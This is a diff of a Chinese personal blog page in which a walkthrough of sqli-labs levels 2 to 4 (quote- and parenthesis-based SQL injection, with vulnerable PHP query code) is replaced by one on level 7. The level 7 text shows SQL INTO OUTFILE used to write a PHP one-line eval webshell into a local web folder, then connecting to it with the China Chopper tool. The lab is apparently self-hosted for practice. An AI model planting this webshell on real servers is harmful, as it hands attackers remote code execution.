@@ -81,22 +81,24 @@
 
 
 
-<meta name="description" content="前言在进行了less-1的靶场练习后，我们就有了完成前4个靶场的能力，只要仔细看好报错语句以及提示，相信less2-4完全不会难住我们。  less-2又看到了那段熟悉的提示，依旧十分愉快地输入上id，也十分愉快地看到了熟悉的账户密码。但是我们再次注入单引号时，发现了这次的报错提示与less-1不一样了。less-1输入单引号后的报错：  You have an error in your SQ">
+<meta name="description" content="前言由于less7相比于其他的关卡比较特殊，因此单独对这个靶场进行详细的分析。less7靶场我们要学习上传一句话木马获得网页的控制权，并且使用工具（例如菜刀）来进行连接。  less7输入id后，我们发现这次的返回文字多了一段“Use outfile……”，那么结合提示我们就可以判断出这题需要我们通过写入文件并注入一句话木马来对网页实现控制。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="sqli-labs练习-less2-4">
-<meta property="og:url" content="http://example.com/2021/09/27/sqli-labs%E7%BB%83%E4%B9%A0-less2-4/index.html">
+<meta property="og:title" content="sqli-labs练习-less7">
+<meta property="og:url" content="http://example.com/2021/10/01/sqli-labs%E7%BB%83%E4%B9%A0-less7/index.html">
 <meta property="og:site_name" content="mrl64&#39;s Blog">
-<meta property="og:description" content="前言在进行了less-1的靶场练习后，我们就有了完成前4个靶场的能力，只要仔细看好报错语句以及提示，相信less2-4完全不会难住我们。  less-2又看到了那段熟悉的提示，依旧十分愉快地输入上id，也十分愉快地看到了熟悉的账户密码。但是我们再次注入单引号时，发现了这次的报错提示与less-1不一样了。less-1输入单引号后的报错：  You have an error in your SQ">
+<meta property="og:description" content="前言由于less7相比于其他的关卡比较特殊，因此单独对这个靶场进行详细的分析。less7靶场我们要学习上传一句话木马获得网页的控制权，并且使用工具（例如菜刀）来进行连接。  less7输入id后，我们发现这次的返回文字多了一段“Use outfile……”，那么结合提示我们就可以判断出这题需要我们通过写入文件并注入一句话木马来对网页实现控制。">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://i.loli.net/2021/09/27/bWogKnu5CxMd4HI.png">
-<meta property="og:image" content="https://i.loli.net/2021/09/27/xocBKpOmCATIgSr.png">
-<meta property="og:image" content="https://i.loli.net/2021/09/27/vCE83o4WDuNLY9K.png">
-<meta property="article:published_time" content="2021-09-27T12:44:02.000Z">
-<meta property="article:modified_time" content="2021-09-27T14:00:24.221Z">
+<meta property="og:image" content="https://i.loli.net/2021/10/01/NsHumx4CFD76ApS.png">
+<meta property="og:image" content="https://i.loli.net/2021/10/01/ALn82iWcZdBbgDx.png">
+<meta property="og:image" content="https://i.loli.net/2021/10/01/vwMCumkdZDHxVip.png">
+<meta property="og:image" content="https://i.loli.net/2021/10/01/VCnqKR8lzvgckyX.png">
+<meta property="og:image" content="https://i.loli.net/2021/10/01/2JxMzgjCuT9REoY.png">
+<meta property="article:published_time" content="2021-10-01T02:53:40.000Z">
+<meta property="article:modified_time" content="2021-10-01T04:56:13.973Z">
 <meta property="article:author" content="liszt_lin">
 <meta property="article:tag" content="-web前端 -mysql">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://i.loli.net/2021/09/27/bWogKnu5CxMd4HI.png">
+<meta name="twitter:image" content="https://i.loli.net/2021/10/01/NsHumx4CFD76ApS.png">
 
 
 
@@ -126,13 +128,13 @@
 
 
 
-  <link rel="canonical" href="http://example.com/2021/09/27/sqli-labs练习-less2-4/"/>
+  <link rel="canonical" href="http://example.com/2021/10/01/sqli-labs练习-less7/"/>
 
 
 
 
 
-  <title>sqli-labs练习-less2-4 | mrl64's Blog</title>
+  <title>sqli-labs练习-less7 | mrl64's Blog</title>
   
 
 
@@ -269,7 +271,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/09/27/sqli-labs%E7%BB%83%E4%B9%A0-less2-4/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/10/01/sqli-labs%E7%BB%83%E4%B9%A0-less7/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="">
@@ -286,7 +288,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">sqli-labs练习-less2-4</h1>
+          <h1 class="post-title" itemprop="name headline">sqli-labs练习-less7</h1>
         
 
         <div class="post-meta">
@@ -298,8 +300,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-09-27T20:44:02+08:00">
-                2021-09-27
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-10-01T10:53:40+08:00">
+                2021-10-01
               </time>
             
 
@@ -359,35 +361,21 @@
 
       
         <blockquote>
-<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在进行了less-1的靶场练习后，我们就有了完成前4个靶场的能力，只要仔细看好报错语句以及提示，相信less2-4完全不会难住我们。</p>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>由于less7相比于其他的关卡比较特殊，因此单独对这个靶场进行详细的分析。less7靶场我们要学习上传一句话木马获得网页的控制权，并且使用工具（例如菜刀）来进行连接。</p>
 </blockquote>
-<h1 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h1><p>又看到了那段熟悉的提示，依旧十分愉快地输入上id，也十分愉快地看到了熟悉的账户密码。但是我们再次注入单引号时，发现了这次的报错提示与less-1不一样了。<br>less-1输入单引号后的报错：</p>
-<ul>
-<li>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’ LIMIT 0,1’ at line 1</li>
-</ul>
-<p>less-2输入单引号后的报错：</p>
-<ul>
-<li>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’ LIMIT 0,1’ at line 1</li>
-</ul>
+<h1 id="less7"><a href="#less7" class="headerlink" title="less7"></a>less7</h1><p>输入id后，我们发现这次的返回文字多了一段“Use outfile……”，那么结合提示我们就可以判断出这题需要我们通过写入文件并注入一句话木马来对网页实现控制。</p>
 <span id="more"></span>
-<p>我们发现引号之中的’1’不见了，再结合第二关的提示（GET-Error based-Intiger based），我们就可以知道在这一关中的sql查询代码中原本id两边的单引号不见了，我们去翻阅下源代码，果不其然：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br></pre></td></tr></table></figure>
 
-<p>既然源代码中id没有了单引号，那么我们就可以直接对其进行注入，如果不放心，我们可以用<code>and 1=1</code>和<code>and 1=2</code>来进行验证。验证成功后，我们就可以进行愉快的爆库流程了:<br><img src="https://i.loli.net/2021/09/27/bWogKnu5CxMd4HI.png"></p>
-<h1 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h1><p>同样的配方，同样的味道，那我们也先使用同样的方式，加上熟悉的单引号后，我们发现这次的报错多了一个新同学：</p>
-<ul>
-<li>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’) LIMIT 0,1’ at line 1</li>
-</ul>
-<p>是括号，他加了括号。已经做了两个靶场的我们，相信已经对那段sql查询代码十分熟悉了，注入的关键点就在那段&amp;id=’id’中。我们将1’带入，发现变量变成了&amp;id=’1’’,这时根据报错我们可以发现引号的右边多出了一个），我们就可以推断本题的查询代码应该为：<br><code>$sql=&quot;SELECT * FROM users WHERE id=(&#39;$id&#39;) LIMIT 0,1&quot;;</code></p>
-<p>查看了源码后，果然如此，那么分析出了代码，那么这题的注入就十分简单了，我们只需要在单引号后补充一个“）”，并将后面的内容注释掉，我们就可以进行熟练的爆库了。<br><img src="https://i.loli.net/2021/09/27/xocBKpOmCATIgSr.png"></p>
-<h1 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h1><p>这次我们发现提示他变了，他从我们的老朋友single quotes变成了double quotes，其实也就是把单引号注入变成了双引号注入，该怎么样还是换汤不换药。既然提示都说了如此，我们这次将单引号换成双引号后进行注入，发现报错如下：</p>
-<ul>
-<li>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘“1””) LIMIT 0,1’ at line 1</li>
-</ul>
-<p>换汤不换药，本关中的报错同上一关只是有几个单引号变成了双引号，那就说明只要我们加上一个右括号并注释后面的内容后就可以进行注入了。在爆库之前，我们把源码拿出来分析一下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$id = &#x27;&quot;&#x27; . $id . &#x27;&quot;&#x27;;</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br></pre></td></tr></table></figure>
-<p>第一行代码的意思就是&amp;id=”id”,我们可以把这关的查询语句看成<code>$sql=&quot;SELECT * FROM users WHERE id=(&quot;id&quot;) LIMIT 0,1;</code>,这样我们就可以很好的理解本关的注入原理了。<br>分析完毕，爆库。<br><img src="https://i.loli.net/2021/09/27/vCE83o4WDuNLY9K.png"></p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>经历了四个靶场的洗礼，我们已经基本掌握了SQL注入的最基本原理与方法。在之后靶场的练习中，我们将学习更多更复杂的注入方式，我们要做好记录，认真研究，及时复习，继续学习相关知识，拓宽自己。</p>
+<p>那么首先，我们也要先找到注入点。试试单引号，双引号，单引号加括号等多种形式，我们找到了答案为单引号加上两个括号。接下来，我们开始进行注入。</p>
+<p>首先要注意的是，我们在进行outfile文件注入的时候必须要有root权限，而且要知道网站绝对路径的地址。不过由于这个靶场是我们自己搭的，因此很容易可以满足这些条件，当然，我们也可在之前的靶场中使用<code>@@datadir</code>指令来获得数据库的路径：<br><img src="https://i.loli.net/2021/10/01/NsHumx4CFD76ApS.png"></p>
+<p>好有了绝对路径，直接动手，我们使用这段代码：<br><code>select ... into outfile &quot;绝对路径&quot;</code><br>这段代码可以将select的内容注入进绝对路径下的一个文件，我们这里注入到一个7.php的文件下，如果没有这个文件会自动创建一个同名文件，但是这条代码不会覆盖原文件，因此写入时最好一次成功，如果要再次写入则需要更换文件名。</p>
+<p>要特别注意的是，在复制绝对路径后，我们需要在“\”后再加上一个“\”或者将“\”改成“/”，例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">D:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\7.php</span><br><span class="line">D:/phpstudy_pro/WWW/sqli-labs-master/Less-7/7.php</span><br></pre></td></tr></table></figure>
+<p>有代码基础的一定知道，“\”代表着转义字符，而“\”才是意味着字符“\”。而“\”的路径是windows系统所独有的表达方式，但“/”表达的路径是可以被windows、linux和mac等操作系统共同识别的，因此更推荐第二种表达路径的方式。</p>
+<p>接下来我们要注入一句话木马了，php格式的一句话木马为：<br><code>&lt;?php @eval($_POST[&#39;chopper&#39;]);?&gt;</code><br>其中的chopper是值，前面的POST（或者REQUEST等）用来获取这个值，这个值之后要用到，可自定义。这样我们就可以使用工具（菜刀，webshell等）进行访问了。</p>
+<p>注入之后我们发现页面虽然报错，但是浏览本地文件，发现了这个7.php已经成功注入进文件夹中了，并且代码也已经被成功写入：<br><img src="https://i.loli.net/2021/10/01/ALn82iWcZdBbgDx.png"><br><img src="https://i.loli.net/2021/10/01/vwMCumkdZDHxVip.png"></p>
+<p>注入成功，我们就可以掏出我们的工具了，这里使用菜刀。<br><img src="https://i.loli.net/2021/10/01/VCnqKR8lzvgckyX.png"><br><img src="https://i.loli.net/2021/10/01/2JxMzgjCuT9REoY.png"><br>如上，连接成功！</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>文件写入是解题时一项重要的技能，在解题时学习工具的使用，将会更好的帮助我们获取数据，解开谜题。</p>
 
       
     </div>
@@ -418,8 +406,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2021/09/26/sqli-labs%E7%BB%83%E4%B9%A0-less1/" rel="next" title="sqli-labs练习 less1">
-                <i class="fa fa-chevron-left"></i> sqli-labs练习 less1
+              <a href="/2021/09/28/sqli-labs%E7%BB%83%E4%B9%A0-less5-6/" rel="next" title="sqli-labs练习-less5-6">
+                <i class="fa fa-chevron-left"></i> sqli-labs练习-less5-6
               </a>
             
           </div>
@@ -427,10 +415,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2021/09/28/sqli-labs%E7%BB%83%E4%B9%A0-less5-6/" rel="prev" title="sqli-labs练习-less5-6">
-                sqli-labs练习-less5-6 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -569,7 +553,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-2"><span class="nav-number"></span> <span class="nav-text">less-2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-3"><span class="nav-number"></span> <span class="nav-text">less-3</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-4"><span class="nav-number"></span> <span class="nav-text">less-4</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number"></span> <span class="nav-text">总结</span></a></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less7"><span class="nav-number"></span> <span class="nav-text">less7</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number"></span> <span class="nav-text">总结</span></a></div>
             
 
           </div>
